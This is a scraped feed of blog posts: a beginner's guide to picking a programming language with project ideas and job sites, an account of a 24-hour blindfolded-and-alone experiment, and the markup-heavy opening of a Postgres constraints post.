<p>I will give you a better explanation. Don’t get confused after seeing the list. We don’t need to know about it anyway. I will provide a good summary of programming language that can use for personal work or company work.</p>
<p>🔷 <strong><a target="_blank" href="https://www.java.com/en/">Java</a></strong></p>
<p>Popularity: Very high</p>
<p>Ease of Learning: Moderate to Difficult</p>
<p>Use Cases: General Use and Specialty</p>
<ul>
<li>Web applications</li>
<li>Mobile</li>
<li>Embedded systems</li>
</ul>
<p>🔷 <strong><a target="_blank" href="https://www.cprogramming.com/">C</a></strong></p>
<p>Popularity: Medium</p>
<p>Ease of Learning: Moderate</p>
<p>Use Cases: General Use and Specialty</p>
<ul>
<li>Embedded systems</li>
<li>Hardware drivers</li>
<li>Local Applications</li>
</ul>
<p>🔷 <strong><a target="_blank" href="https://python.org/">Python</a></strong></p>
<p>Popularity: Very High</p>
<p>Ease of Learning: Easy to Moderate</p>
<p>Use Cases: General Use and Specialty</p>
<ul>
<li>Web Applications</li>
<li>Artificial Intelligence</li>
<li>Machine Learning</li>
</ul>
<p>🔷 <strong><a target="_blank" href="https://isocpp.org/">C++</a></strong></p>
<p>Popularity: High</p>
<p>Ease of Learning: Difficult</p>
<p>Use Cases: General Use, Specialty</p>
<ul>
<li>Local Applications</li>
<li>Web Services</li>
<li>Proprietary Services</li>
</ul>
<p>🔷 <strong><a target="_blank" href="https://docs.microsoft.com/en-us/dotnet/csharp/">C#(Sharp)</a></strong></p>
<p>Popularity: High</p>
<p>Ease of Learning: Moderate</p>
<p>Use Cases: General Use</p>
<ul>
<li>Web Applications</li>
<li>Local Applications</li>
<li>Services/Microservices</li>
</ul>
<p>🔷 <strong><a target="_blank" href="https://www.w3schools.com/">HTML</a></strong></p>
<p>Popularity: High</p>
<p>Ease of Learning: Easy</p>
<p>Use Cases: Web Sites and Application</p>
<ul>
<li>Web Development</li>
</ul>
<p>🔷 <strong><a target="_blank" href="https://developer.mozilla.org/en-US/docs/Web/JavaScript">Java Script</a></strong></p>
<p>Popularity: Very High</p>
<p>Ease of Learning: Moderate</p>
<p>Use Cases: General Use</p>
<ul>
<li>Local Applications</li>
<li>Web Applications</li>
</ul>
<p>🔷 <strong><a target="_blank" href="https://www.php.net/">PHP</a></strong></p>
<p>Popularity: High</p>
<p>Ease of Learning: Easy</p>
<p>Use Cases: General Use</p>
<ul>
<li>Web Applications</li>
</ul>
<p>🔷 <strong><a target="_blank" href="https://www.mysql.com/">SQL</a></strong></p>
<p>Popularity: Very High</p>
<p>Ease of Learning: Easy to Moderate</p>
<p>Use Cases: Specialty</p>
<ul>
<li>Database Queries</li>
</ul>
<p>🔷 <strong><a target="_blank" href="https://developer.apple.com/library/archive/documentation/Cocoa/Conceptual/ProgrammingWithObjectiveC/Introduction/Introduction.html">Objective-C</a></strong></p>
<p>Popularity: High</p>
<p>Ease of Learning: Difficult</p>
<p>Use Cases: Mobile Applications</p>
<ul>
<li>Apple iOS devices: iPhone, iPad</li>
</ul>
<p>🔷 <strong><a target="_blank" href="https://www.ruby-lang.org/en/">Ruby</a></strong></p>
<p>Popularity: High</p>
<p>Ease of Learning: Easy to Moderate</p>
<p>Use Cases: General</p>
<ul>
<li>Web Applications</li>
<li>Scripting</li>
</ul>
<p>🔷 <strong><a target="_blank" href="https://developer.apple.com/swift/">Swift</a></strong></p>
<p>Popularity: Medium</p>
<p>Ease of Learning: Moderate to Difficult</p>
<p>Use Cases: Apple Mobile and Desktop applications</p>
<ul>
<li>MacBook</li>
<li>iPhone</li>
<li>iPad</li>
</ul>
<p>🔷 <strong><a target="_blank" href="https://golang.org/">GO</a></strong></p>
<p>Popularity: Low</p>
<p>Ease of Learning: Moderate</p>
<p>Use Cases: General</p>
<ul>
<li>Web Applications</li>
<li>Local Applications</li>
</ul>
<p>🔷 <strong><a target="_blank" href="https://www.perl.org/">Perl</a></strong></p>
<p>Popularity: High</p>
<p>Ease of Learning: Easy to Moderate</p>
<p>Use Cases: General</p>
<ul>
<li><p>Local Applications</p>
</li>
<li><p>Web Applications</p>
</li>
</ul>
<p>🔷 <strong><a target="_blank" href="https://dart.dev/">Dart</a></strong></p>
<p>Popularity: Niche</p>
<p>Ease of Learning: Moderate</p>
<p>Use Cases: General</p>
<ul>
<li>Web Applications</li>
<li>Mobile Applications</li>
</ul>
<p>🔷 <strong><a target="_blank" href="https://kotlinlang.org/">Kotlin</a></strong></p>
<p>Popularity: Medium</p>
<p>Ease of Learning: Moderate</p>
<p>Use Cases: Mobile Development</p>
<ul>
<li>Android Applications</li>
</ul>
<p>🔷 <strong><a target="_blank" href="https://visualstudio.microsoft.com/vs/features/net-development/">Visual Basic .NET</a></strong></p>
<p>Popularity: Low</p>
<p>Ease of Learning: Moderate</p>
<p>Use Cases: General Use</p>
<ul>
<li>Web Applications</li>
<li>Local Applications</li>
</ul>
<p><img src="http://carlcheo.com/wp-content/uploads/2014/12/which-programming-language-should-i-learn-first-infographic.png">
<em>Image Credit: <a href="http://carlcheo.com/" target="_blank">Carlcheo.com</a> </em></p>
<p>Choose only one. Start from the very basic and practice every day for at least 2 hours. And try to solve problems.</p>

<h2 id="work-on-projects">Work On Projects🗄️</h2>
<p>After choosing a project or where you want to work, choose a language. And after that, <strong>Start working on small projects</strong>. Like building a simple calculator. Little by little, go from small to big projects. Projects will help you to understand what is lacking. Challenge yourself to create new things.</p>
<p>Best things to do, Build 30 things in 30 days of the challenge.</p>
<p><strong>#build30thingschallenge #mubinsodyssey</strong> on Twitter with us.</p>
<p>Here some project Ideas, if you don’t have for yourself. I would say work on the common and small projects first, then go for your ones. It will be more productive and efficient for you.</p>
<ul>
<li>Guess The Number</li>
<li>Rock, Paper, Scissors Game</li>
<li>Password Generator</li>
<li>Dice Rolling Simulator</li>
<li>Hangman Game</li>
<li>Digital Cloak</li>
<li>Word Counter Tool</li>
<li>Percentage Calculator</li>
<li>Height &amp; Weight Converter Calculator</li>
<li>Temperature Conversion tool</li>
<li>Restaurant Bill Management System</li>
<li>ATM Management System</li>
<li>Movie Ticket Booking System</li>
<li>Attendance Management System</li>
<li>Tic Tac Toe Game</li>
<li>Banking System</li>
<li>Library Management System</li>
<li>Student Report Card Generator</li>
<li>Contact Management system</li>
<li>Pacman Game</li>
<li>Personal Diary management system</li>
<li>Quiz Game</li>
<li>Typing Tutor</li>
</ul>
<p>And many more. Just google small projects.</p>

<h2 id="whats-next">What’s Next ⏭</h2>
<p>After that, chose one of the below options that suit best for you.</p>
<ul>
<li>Apply for a job; which will help you to get real-world experiences in the programming world</li>
<li>Freelancing; which will introduce you to other programmers where you can enrich your programming knowledge</li>
<li>Startup; It will develop your own idea.</li>
</ul>
<p>Here some best websites you can search for your desired jobs.</p>
<ul>
<li><a target="_blank" href="https://jobs.github.com/positions?description=&amp;location=Remote">Github</a></li>
<li><a target="_blank" href="https://stackoverflow.com/jobs">Stack overflow</a></li>
<li><a target="_blank" href="https://jsremotely.com/">JSRemotely</a></li>
<li><a target="_blank" href="https://authenticjobs.com/">Authentic Jobs</a></li>
<li><a target="_blank" href="https://www.indeed.com/">Indeed</a></li>
<li><a target="_blank" href="https://jobbatical.com/explore">Jobbatical</a></li>
<li><a target="_blank" href="https://weworkremotely.com/">We work remotely</a></li>
<li><a target="_blank" href="https://bigcloud.io/">Bigcloud</a></li>
<li><a target="_blank" href="https://remoteok.io/">Remote Ok</a></li>
<li><a target="_blank" href="https://www.androidjobs.io/">AndroidJobs</a></li>
<li><a target="_blank" href="https://landing.jobs/">Landing Jobs</a></li>
<li><a target="_blank" href="https://ai-jobs.net/">Ai-jobs</a></li>
<li><a target="_blank" href="https://www.toptal.com/">Toptal</a></li>
<li><a target="_blank" href="https://www.upwork.com/">Upwork</a></li>
<li><a target="_blank" href="http://www.guru.com/">Guru</a></li>
<li><a target="_blank" href="https://www.freelancer.com/">Freelancer</a></li>
<li><a target="_blank" href="https://www.fiverr.com/">Fiverr</a></li>
</ul>

<hr>
<p>🚩👉 If it was useful to you, please Like/Share to reach others as well. Please hit the <strong><em>Subscribe</em></strong> button at the top of the page to get an email notification on my latest posts.</p>
<p>I talk about web development and UI design on <strong>Twitter</strong> <a target="_blank" href="https://twitter.com/kmhmubin">@kmhmubin</a>, come to talk with me there!</p>
<p>The cover image is an improvisation on top of the work from <a target="_blank" href="https://www.freepik.com/vectors/arrow">Freepik</a>.</p>
</div></div>]]>
            </description>
            <link>https://mubinsodyssey.com/how-to-choose-a-programming-language-guide-2021</link>
            <guid isPermaLink="false">hacker-news-small-sites-25032086</guid>
            <pubDate>Mon, 09 Nov 2020 07:01:51 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[I'm going to experiment by being Blind and Alone for 24 Hours]]>
            </title>
            <description>
<![CDATA[
Score 54 | Comments 42 (<a href="https://news.ycombinator.com/item?id=25031774">thread link</a>) | @Osiris30
<br/>
November 8, 2020 | https://dormin.org/2020/11/08/the-blind-alone-and-confused-for-24-hours-challenge/ | <a href="https://web.archive.org/web/*/https://dormin.org/2020/11/08/the-blind-alone-and-confused-for-24-hours-challenge/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-896">

	
	<!-- .entry-header -->


			<div>

			
<figure><img data-attachment-id="901" data-permalink="https://dormin.org/bird-box/" data-orig-file="https://dorminorg.files.wordpress.com/2020/11/bird-box.jpg" data-orig-size="2000,1050" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="bird-box" data-image-description="" data-medium-file="https://dorminorg.files.wordpress.com/2020/11/bird-box.jpg?w=300" data-large-file="https://dorminorg.files.wordpress.com/2020/11/bird-box.jpg?w=760" src="https://dorminorg.files.wordpress.com/2020/11/bird-box.jpg?w=1024" alt="" srcset="https://dorminorg.files.wordpress.com/2020/11/bird-box.jpg?w=1024 1024w, https://dorminorg.files.wordpress.com/2020/11/bird-box.jpg?w=150 150w, https://dorminorg.files.wordpress.com/2020/11/bird-box.jpg?w=300 300w, https://dorminorg.files.wordpress.com/2020/11/bird-box.jpg?w=768 768w, https://dorminorg.files.wordpress.com/2020/11/bird-box.jpg 2000w" sizes="(max-width: 1024px) 100vw, 1024px"></figure>



<p>For 24 hours I will be blind and alone in my apartment. I eventually want to try being blind for a week, but I’ll need seven days with no other obligations, and I won’t have that for a while. For now, I’ll suffice with a smaller-scale experiments with a few extra provisions for added difficulty.</p>







<ol type="1"><li>I must leave my blindfold on for 24 hours.<ul><li>If I remove the blindfold, I have failed the experiment</li><li>If the blindfold falls off or I can get partial sight, I have failed the experiment.</li><li>I am only allowed to readjust my blindfold if I can see light.</li></ul></li><li>I must not be in contact with any other people for 24 hours.<ul><li>I cannot answer my phone or any other messaging system.</li><li>I cannot receive in-person visitors.</li><li>If someone knocks at the door, I cannot answer verbally or physically.</li></ul></li><li>I will set an alarm for 24 hours. I cannot set any other alarms or use any other means to ascertain the time.<ul><li>It is up to me to keep my phone charged so the alarm goes off.</li></ul></li><li>I cannot leave my apartment.</li></ol>











<p>I have no good reason. I just want to see if I am capable of doing it and what will happen. Some things I’m curious about:</p>



<ul><li>Do I have the willpower to get through the experiment?</li><li>Will I become disoriented from losing all sense of time?</li><li>Will I be able to stave off boredom with podcasts, audiobooks, and music on my phone?</li><li>Will I enter some sort of meditative state due to a lack of sensory input?</li><li><a href="https://www.discovermagazine.com/the-sciences/scientists-made-people-wear-blindfolds-for-4-days-the-resulting-hallucinations-were-incredible">Will I hallucinate</a>?</li><li>Will my non-sight senses heighten?</li><li>Will I hurt myself by falling or banging into something?</li><li>Will I sleep?</li><li>Will I eat? Is consuming caffeine a good idea (for entertainment) or a bad idea (energy with no direction)?</li><li>Will this experience make me more interested in being blind for a week? Or less?</li></ul>



<figure><img src="https://digitalimpact.io/wp-content/uploads/2014/08/Blind.png" alt="Modern CEOs Are Blindfolded - Digital Impact"></figure>







<p>Attempt One started at 10:30 AM and failed at 1:13 PM. I purposefully took off my blindfold because I was worried that my multiple failures to input my Iphone’s password had resulted in a permanent lock or data wipe. But the password screen was just locked for a minute and all was well.</p>



<p>Given that I failed in the early afternoon, I considered restarting the experiment on another day in the morning. But I had already carved out a 24 hour period when I wouldn’t do any work or be disturbed, and it might have been a week or two longer before I got that opportunity again.</p>



<p>So I checked my messages, briefly went on Reddit, and then restarted.</p>



<div><figure><img data-attachment-id="903" data-permalink="https://dormin.org/t86752/" data-orig-file="https://dorminorg.files.wordpress.com/2020/11/blindfold-2.jpg" data-orig-size="521,610" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;CSA Images \/ CSA Images&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;Blindfolded Woman&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;\u00a9 CSA Images \/ CSA Images&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;T86752&quot;,&quot;orientation&quot;:&quot;1&quot;}" data-image-title="T86752" data-image-description="" data-medium-file="https://dorminorg.files.wordpress.com/2020/11/blindfold-2.jpg?w=256" data-large-file="https://dorminorg.files.wordpress.com/2020/11/blindfold-2.jpg?w=521" src="https://dorminorg.files.wordpress.com/2020/11/blindfold-2.jpg?w=521" alt="" srcset="https://dorminorg.files.wordpress.com/2020/11/blindfold-2.jpg 521w, https://dorminorg.files.wordpress.com/2020/11/blindfold-2.jpg?w=128 128w, https://dorminorg.files.wordpress.com/2020/11/blindfold-2.jpg?w=256 256w" sizes="(max-width: 521px) 100vw, 521px"></figure></div>







<p>Attempt Two was successful. I put on my blindfold at 1:23 PM on Thursday, November 5, 2020. I removed it at 1:28 PM on Friday, November 6.</p>



<p>It was an… interesting experience. I don’t recommend it, but I’m glad I did it. I’m not sure where to begin in describing it, especially since I couldn’t take notes, and part of the challenge was being confused. But I’ll do my best to break down the experience.</p>



<div><figure><img src="https://cdn.shopify.com/s/files/1/0818/3417/products/Les_Sublimes_Cashmere_Scarf_Dark_Blue_packshot_2048x.jpg?v=1539973736" alt="Large Cashmere Scarf in Dark Blue | Les Sublimes" width="427" height="427"></figure></div>



<h2><strong><span>Blindfold</span></strong></h2>



<p>To simulate blindness, I used a dark blue scarf as a blindfold. One layer wasn’t quite dark enough, so I folded it in half for extra light defense.</p>



<p>With the blindfold securely on, my vision was the same whether my eyes were open or closed. I kept my eyes closed 99.9% of the time since it was usually more comfortable and helped limit light. I occasionally opened my eyes to check the brightness level and to… I guess you could call it <em>stretch my eyelids.</em> They don’t feel good if you leave them closed for too long.</p>



<p>I couldn’t get a perfect scarf seal around my eyes, so sometimes when I tilted my head back while sitting I noticed a little light come into the bottom of my vision. To limit this, I often pinched the scarf around my nose in that position. But many/most blind people can see some light anyway, so I don’t think this was a significant violation of the experiment.</p>



<p>My eyes got quite dry under the scarf, so I applied moisturizer to this lids and sockets four or five times. I wanted to use eyedrops too, but there was no way to do so without failing the experiment.</p>



<figure><img loading="lazy" data-attachment-id="906" data-permalink="https://dormin.org/image/" data-orig-file="https://dorminorg.files.wordpress.com/2020/11/image.jpeg" data-orig-size="225,225" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="image" data-image-description="" data-medium-file="https://dorminorg.files.wordpress.com/2020/11/image.jpeg?w=225" data-large-file="https://dorminorg.files.wordpress.com/2020/11/image.jpeg?w=225" src="https://dorminorg.files.wordpress.com/2020/11/image.jpeg?w=225" alt="BLACK N BLACK - #blackouttuesday ✊🏻✊🏼✊🏽✊🏾✊🏿 | Facebook" width="786" height="786" srcset="https://dorminorg.files.wordpress.com/2020/11/image.jpeg 225w, https://dorminorg.files.wordpress.com/2020/11/image.jpeg?w=150 150w" sizes="(max-width: 786px) 100vw, 786px"></figure>



<h2><strong><span>Blindness</span></strong></h2>



<p>Initially, everything was black, but as the day went on and the sun went down, I could tell it was nighttime even through two layers of scarf and my eyelids. I’m not sure if I could tell because my eyes had adjusted to become extremely sensitive to light, or if there were other subtle signals (ie. noises, air temperature, circadian rhythms, etc.) which my body picked up on. As evidence of the latter, I could not see any difference between the tv being on or off, nor the refrigerator being opened or closed, even when I was sitting right in front of either.</p>



<p>What I saw depended on how I applied my focus. If I did focus on my vision, I’d see the typical blackness you get from closing your eyes, but it was never perfectly black nor uniform; there was always some odd movement and occasional coloring (whiteness, pale blue, or sometimes red). The most common distortions were a swirling or flowing whiteness, sort of like cream in coffee. I hoped that being blindfolded for so long would make the distortions more extreme, but for the most part it looked no different than what you’d see if you closed your eyes right now for ten minutes.</p>



<p>There was one exception. It must have been about 20+ hours into the experiment, and my eyes were itching, so I rubbed both of them at the same time over the scarf. If you rub your closed eyes and focus on your sight any time you can see some weird stuff, but this was far more extreme than usual. I remember my entire vision filling up with white bubbles which then broke and briefly returned to black. Then white lightning bolt shapes stretched across my sight, expanded to make my vision purely white, and then slowly faded back to black. The strangest thing about it was the <em>brightness</em>. I literally felt like I was staring into lights despite being blindfolded in a dark room. Unfortunately, it only lasted about 30 seconds, but my heart was racing.</p>



<p>More notable than what I saw was what I didn’t see. By default, I was lost in thought and I focused on nothing. In such a state, I didn’t even register my vision or notice the darkness. I <em>think</em> this made my imagination and mental visualization more acute. On occasion, I’d be deep in thought and I’d get the <em>brightness</em> sensation again because I’d be mentally picturing something so vividly that the inevitable return to darkness felt like shutting off the lights in my brain. I’ll explain more about this in the <strong>Three Phases</strong> section.</p>



<p>Sadly, I did not hallucinate, or at least not as far as I could tell.</p>



<figure><img src="https://i1.wp.com/www.intelligentliving.co/wp-content/uploads/2014/07/sloth-sleeping.jpg?fit=1024%2C698&amp;ssl=1" alt="Fighting Bacteria With Sloth Fur"></figure>



<h2><strong><span>Energy</span></strong></h2>



<p>This was the most surprising aspect of the experiment.</p>



<p>I read that <a href="https://abcnews.go.com/Health/story?id=117902&amp;page=1#:~:text=Without%20light%20cues%20that%20the,as%20a%20result%2C%20researchers%20say.">blind people have trouble getting to sleep</a> because they don’t access any/enough light for their circadian rhythms. I seem to have the exact opposite problem. Without light, my body always thinks it’s time to sleep and has trouble doing anything else. Throughout most of the experiment, I felt extremely lethargic, lazy, and had to fight to stay awake.</p>



<p>I started my first failed experiment attempt at 10:30 AM. I had gotten 7.5 solid hours of sleep, I hadn’t done anything tiring the previous day, and I generally felt fine. Then I put on my blindfold, and within thirty minutes I was nodding off. I semi-slept for two hours before deciding to get an energy drink to get myself out of the funk. That worked, but as soon as it wore off, I was back in semi-sleep mode.</p>



<p>Even when I was firmly awake, I generally felt weak and lethargic. Movement around the apartment was annoying of course, but made so much more difficult by my energy levels. I ended up lying perfectly still in my comfy computer chair with my feet on a table 95% of the time. That is, when I wasn’t lying in bed.</p>



<p>On the other hand, when I removed my blindfold after 24 hours, I experienced a <em>burst</em> of energy. Seriously, it was like I had downed a double shot of espresso. It was like a switch had been flicked. The haziness and cobwebs were gone in an instant, and I felt the energy coursing through my body. I guess light has a big impact on me.</p>



<div><figure><img data-attachment-id="908" data-permalink="https://dormin.org/blind-man-2/" data-orig-file="https://dorminorg.files.wordpress.com/2020/11/blind-man-2.jpg" data-orig-size="615,479" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;1604789422&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;1&quot;}" data-image-title="blind-man-2" data-image-description="" data-medium-file="https://dorminorg.files.wordpress.com/2020/11/blind-man-2.jpg?w=300" data-large-file="https://dorminorg.files.wordpress.com/2020/11/blind-man-2.jpg?w=615" src="https://dorminorg.files.wordpress.com/2020/11/blind-man-2.jpg?w=615" alt="" srcset="https://dorminorg.files.wordpress.com/2020/11/blind-man-2.jpg 615w, https://dorminorg.files.wordpress.com/2020/11/blind-man-2.jpg?w=150 150w, https://dorminorg.files.wordpress.com/2020/11/blind-man-2.jpg?w=300 300w" sizes="(max-width: 615px) 100vw, 615px"></figure></div>



<h2><strong><span>Movement</span></strong></h2>



<p>I moved exactly how you’d expect… clumsily.</p>



<p>For the most part, I slowly walked around my apartment with a hand out to feel for walls and edges. Sometimes I’d get lazy and crawl just so it was easier. I know my apartment well enough that it wasn’t hard to get around, but every once in awhile I’d lose track of where I was and would be left slowly swinging my arm around searching for anything. It’s not a pleasant sensation.</p>



<p>Before the experiment, I had planned to pace around for fun, or maybe even do some exercise with the free time. But the confusion and especially the lethargy stopped all that. I just sat in my chair and didn’t move unless I needed to get a drink, go to the bathroom, or sleep.</p>



<p>I kind of wish I had done the experiment in an unfamiliar environment to add to the movement challenge, but oh well.</p>



<div><figure><img src="https://secure.img1-fg.wfcdn.com/im/99629273/compr-r85/1167/116715839/dual-flush-elongated-one-piece-toilet-seat-included.jpg" alt="DeerValley Dual-Flush Elongated One-Piece Toilet (Seat Included) &amp; Reviews  | Wayfair" width="729" height="729"></figure></div>



<h2><strong><span>Necessities</span></strong></h2>



<p>For food, I ate a big lunch at 10 AM before the experiment and then munched on dark chocolate throughout the night. I felt the heavy lethargy well before the lack of calories was an issue. I probably should have put some prepackaged meals in my fridge to eat, but I was worried about making a mess and not being able to clean up. Do I want ants? Because that’s how I get ants.</p>



<p>For drinks, I could manage to get to the kitchen and fill a cup with water when I needed to. I never took a full cup back to my chair just in case I knocked it over (clean up would be a nightmare). I also had some diet coke to serve as entertainment and put a little caffeine in me.</p>



<p>For the bathroom, I (a man) peed sitting down. I’m not ashamed to admit it.</p>



<div><figure><img src="https://imgaz2.staticbg.com/thumb/large/oaupload/banggood/images/F2/09/b934b522-e3e3-491d-b758-d0b92c259f0c.jpg" alt="Novel surreal melting distorted wall clock surrealist salvador dali style  wall clock amazing home decoration gift Sale - Banggood.com" width="802" height="801"></figure></div>



<h2><strong><span>Time</span></strong></h2>



<p>As part of the experiment, I never knew what time it was. This was intended to confuse me throughout the 24 hours, and it did, but it may have helped too. With no sense of time, it was easy to sit back and not think about it. Time drifted by and I existed. That was that.</p>



<p>I actually did ask Siri for the time once… it was late in the experiment, and it felt like I had put on the blindfold forever ago. As you’d expect, …</p></div></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://dormin.org/2020/11/08/the-blind-alone-and-confused-for-24-hours-challenge/">https://dormin.org/2020/11/08/the-blind-alone-and-confused-for-24-hours-challenge/</a></em></p>]]>
            </description>
            <link>https://dormin.org/2020/11/08/the-blind-alone-and-confused-for-24-hours-challenge/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25031774</guid>
            <pubDate>Mon, 09 Nov 2020 05:39:11 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Postgres Constraints]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25031762">thread link</a>) | @mkfeuhrer
<br/>
November 8, 2020 | https://www.mohitkhare.com/blog/postgres-constraints | <a href="https://web.archive.org/web/*/https://www.mohitkhare.com/blog/postgres-constraints">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-v-373a3b57=""><div data-v-373a3b57=""><div data-v-373a3b57=""><div data-v-373a3b57=""><div data-v-373a3b57=""><p data-v-373a3b57="">Postgres Constraints</p> <div data-v-373a3b57=""><div data-v-373a3b57=""><div data-v-373a3b57=""><div data-v-373a3b57=""><a href="https://www.mohitkhare.com/categories/postgres" data-v-373a3b57=""><p>Postgres</p></a></div><div data-v-373a3b57=""><a href="https://www.mohitkhare.com/categories/programming" data-v-373a3b57=""><p>Programming</p></a></div></div> <p><span data-v-373a3b57="">7 Nov 2020</span></p></div></div></div> <p><img data-src="/_nuxt/img/postgres-constraints.8f3344a.webp" alt="Postgres Constraints" data-v-25298ab3="" src="https://www.mohitkhare.com/_nuxt/img/postgres-constraints.8f3344a.webp"></p></div></div> <div data-v-1bfa12aa="" data-v-373a3b57=""><p data-v-1bfa12aa="">Get latest articles directly in your inbox</p> <div data-v-1bfa12aa=""><form action="https://usetaski.us18.list-manage.com/subscribe/post?u=2974614c11e6abca644007be7&amp;id=3b5ecce493" method="post" name="mc-embedded-subscribe-form" target="_blank" novalidate="" data-v-1bfa12aa=""><div data-v-1bfa12aa=""> </div></form></div></div>  <div data-v-5c76b055="" data-v-373a3b57=""><p data-v-5c76b055="">Liked the content? Do support :)</p> <div data-v-5c76b055=""><p><a href="https://www.paypal.me/mkfeuhrer" aria-label="Paypal - Mohit Khare" data-v-5c76b055=""><img src="https://www.mohitkhare.com/_nuxt/9922499ba185bcccc368872c4cf7b0ea-320.png" alt="Paypal - Mohit Khare" width="125px" data-v-5c76b055=""></a></p> <p><a target="_blank" href="https://www.buymeacoffee.com/chHAzigTb" aria-label="Buy me a coffee - Mohit Khare" data-v-5c76b055=""><img src="https://www.mohitkhare.com/_nuxt/img/bmc.87873ba.svg" width="175px" alt="Buy me a coffee" data-v-5c76b055=""></a></p></div></div>  <div data-v-373a3b57=""></div></div> <div data-v-373a3b57=""><div data-v-e9f7aa1a="" data-v-373a3b57=""><p data-v-e9f7aa1a="">Explore more</p> <div data-v-e9f7aa1a=""><div data-v-e9f7aa1a=""><div data-v-36f5b510="" data-v-e9f7aa1a=""><div data-v-36f5b510=""><div data-v-36f5b510=""><a href="https://www.mohitkhare.com/blog/personal-okrs" data-v-36f5b510=""><p><img data-src="/_nuxt/0b543a8b05ad63f5c8bf88ee97692842-613.png" data-loading="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACgAAAAbCAIAAACBclo5AAAACXBIWXMAAAsSAAALEgHS3X78AAAHz0lEQVRIx4WWC1AU9x3HzyQGnWk0NjhNmmQSnWkmMU/HNDbBRp3WPJtobTXaVIoJY6tTsG3UZqpCFBFBpEInvAQUEB88AiKvk8cdj8PjIQ/hEBA57o673b3X3r5u7/bu2P52F5aDaML82Pvv4/6f//f7+/1/ewo366UZliBpJ044cBdisfTcVCnz41VZ0f2lJ7DWXEd7nrUtx9qabW09Z23JtrZk2dpgkClEcwbWkom1ZGHNmZg6E1Wlo6pvEVU60phm0NVTjLenT/PVkReOJv08fO/yrZ8vXfX6o5/u/EnUkdC174YoWA/HuD007ZbY4/qJu2Njw7p+5ZU0Vc7B7qLDE/X/c9y8YNPkYgAW8NkiEsBZEh4DPIQa4lu0OQNtTDX31KE2Q58uV1lf8uHHL3x17Mk16xaueSdkV2TohvcXv/bLhe9uWiyAJTZFuyFqamvO/je5sbHBbJ5sVZbW5x3R5h8aqUrG2nLsGkG3qC9DkjsjWlgBpk7HBGqaRVOIYqiL8JjRsW8Sf/fYEsX2Xct2fLnk8Z8qVr0SsvVPS555dsGb74RMg2W2zeac0N/LykgtKLgA3+++qW66mqopPKwrjzerMh2aXFGoGDJY8FkwGY6IKgMxjDgJBsddnI8fHOzd9nnonn8si4he9otVDz/19EPrP1j87PMPP/HEglmwmGw3jpMUzd65M/yb9evyL+QRJKkb6GutLmq/Et9bfGy8NkXWPWMyUAUkmIw0piLDWoeLIQiKohiQMWEYOvD1ug3vPbLm7UU/e0rxyupHN360OHT5gtffWqSQqVLA07iLhGhoaNi2dcuVSxdhNXq9vkNd1VGZ3lsWP1SRgLVmA15ATleWiAeTb1XanS6BKmaNICncRZ2Mj1v5ogJIm3c+Hv2f0LW/XvTMcw+98atHFDJSCqHQGNZFUG6WGxkdq6ur6+rqtNmdDodzoEerqc7vLk8Z/C7eeCPN3pYDKxBqSrQa0RRYUYuLoMEximEBDJPQtFfb1fDP2OdffiPks78s3xGx7LmVC/cdXLF5x8r5YIkNQRA0zXgY1qsbuqPRtBmNJpygxsdG2hvKtZXpgxWnxquTsRZhjwEYVWcgeh1OMiRJwwaBpYPVBEEy7kBnb3Vr55FDX3/y0e+f/DI69LXVCz+LeGz123MVB3su1ZqwasYzYZjs7u5GEMTpIlEU7e9q6VQW3r6eMlKZaFEJu8iia3a4KBLESlSwmhIWAQbojV0mS7PTgVXUJMadfTo5dUtU1O5/x743W1zzQsaTFEOLibcgqNlisdkdsN3HRoeGe1qGVQWDJbHmjhKbAydmtAaBGSeO2x12zDqGu7yGybZrDe+jti6O42mGmgV7vL4HrUCsFBqOY/fG1Wo1jHGCxlDs7kCncaDZhppcJAMkQEolIoEJUbETd9kdUCGMydx3V59ntdqsNszuJBQS8gdCZE/vctBttdkh/S6h8ikQ73DRLpIWUsuwcoKCrIbCJsEih5NEMYMZ6XM6hf7oxMkfBwfhvZKTEOC/S5wX9gxUgaRVeuB7YAowDqeg22a3whgCLipkn38UHJz4WYCYV4k65zqAYXEzYIkNWuEUAq7PyfEPU4Px0pajRZJElf2QwTNpnmVL1P